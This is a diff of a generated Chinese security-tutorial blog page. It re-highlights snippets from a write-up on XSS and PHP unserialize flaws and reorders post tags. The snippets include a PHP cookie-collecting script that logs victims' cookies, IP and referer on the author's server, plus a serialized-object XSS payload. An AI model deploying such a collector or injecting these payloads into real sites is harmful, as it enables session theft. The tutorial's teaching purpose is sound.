@@ -175,7 +175,7 @@
 </ul>
 <p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
 <ul>
-<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$cookie = $_GET[<span class="string">'cookie'</span>];</span></span><br><span class="line"><span class="php">$time = time();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php">$txt = date(<span class="string">"Y/m/d-h:i:s"</span>).<span class="string">" ip="</span>.$ip.<span class="string">"  cookie="</span>.$cookie.<span class="string">" referer="</span>.$referer.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php">file_put_contents(<span class="string">"log.txt"</span>,$txt,FILE_APPEND);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$referer = $_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$txt = date(&quot;Y/m/d-h:i:s&quot;).&quot; ip=&quot;.$ip.&quot;  cookie=&quot;.$cookie.&quot; referer=&quot;.$referer.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $txt;</span><br><span class="line">file_put_contents(&quot;log.txt&quot;,$txt,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -326,10 +326,10 @@
 
 <p>我们来追溯下输入普通字符串时和payload的时候程序内部的状态:</p>
 <ul>
-<li><p>“geidalaodicha”</p>
+<li><p><code>geidalaodicha</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'o'</span>] = <span class="string">"geidalaodicha"</span></span><br><span class="line">$s = <span class="string">"geidalaodicha"</span></span><br><span class="line">unserialize($s)无法正常执行!</span><br><span class="line">(!@$unser = unserialize($s))为真 </span><br><span class="line">进入第一个分支, $html = <span class="string">"&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;"</span></span><br><span class="line">打印 $html</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>“O:1:”S”:1:{s:4:”test”;s:29:”<script>alert('xss')</script>“;}”</p>
+<li><p><code>O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'o'</span>] = <span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:29:"</span>&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;<span class="string">";&#125;"</span></span><br><span class="line">$s = <span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:29:"</span>&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;<span class="string">";&#125;"</span></span><br><span class="line">unserialize($s)执行并返回$s反序列后的<span class="class"><span class="keyword">class</span> <span class="title">S</span>的实例对象</span></span><br><span class="line">进入第二个分支, $html = "&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;"</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $html;<span class="meta">?&gt;</span>  =&gt;  打印出$unser-&gt;test的值, 也就是`&lt;script ...`</span><br><span class="line">`&lt;script...` 写入html中, 在前端执行.</span><br></pre></td></tr></table></figure>
 
 </li>
@@ -344,9 +344,9 @@
         
         <tags>
             
-            <tag> sql注入 </tag>
-            
             <tag> xss </tag>
+            
+            <tag> sql注入 </tag>
             
             <tag> PHP反序列化漏洞 </tag>
             
@@ -909,9 +909,9 @@
         
         <tags>
             
-            <tag> 主机扫描 </tag>
-            
             <tag> web </tag>
+            
+            <tag> 主机扫描 </tag>
             
         </tags>
         
